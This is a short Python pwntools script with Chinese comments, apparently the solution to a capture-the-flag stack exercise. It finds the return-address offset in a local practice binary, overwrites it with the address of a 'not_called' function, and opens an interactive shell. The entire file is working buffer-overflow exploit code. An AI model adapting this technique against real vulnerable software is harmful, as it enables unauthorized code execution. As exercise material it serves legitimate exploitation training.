from pwn import *

binary = './pwn/stack/rop-1/rop1'

# 启动进程
io = process(binary)

# Step 1: 确定返回地址的偏移
# 首先，我们需要创建一个模式字符串来确定偏移量
pattern = cyclic(256)
io.sendline(pattern)

# 让程序崩溃并捕获崩溃信息
io.wait()
core = io.corefile
eip_value = core.eip
log.info("EIP is overwritten with: 0x{:08x}".format(eip_value))

# 使用cyclic_find找到偏移量
offset = cyclic_find(eip_value)
log.success("Offset found: {}".format(offset))

# Step 2: 获取 `not_called` 函数的地址
elf = ELF(binary)
not_called_addr = p32(elf.symbols['not_called'])
log.info("Address of not_called: 0x{:08x}".format(u32(not_called_addr)))

# Step 3: 构造载荷
payload = b'A' * offset
payload += not_called_addr

# Step 4: 发送载荷
io = process(binary)
io.sendline(payload)

# Step 5: 与shell交互
io.interactive()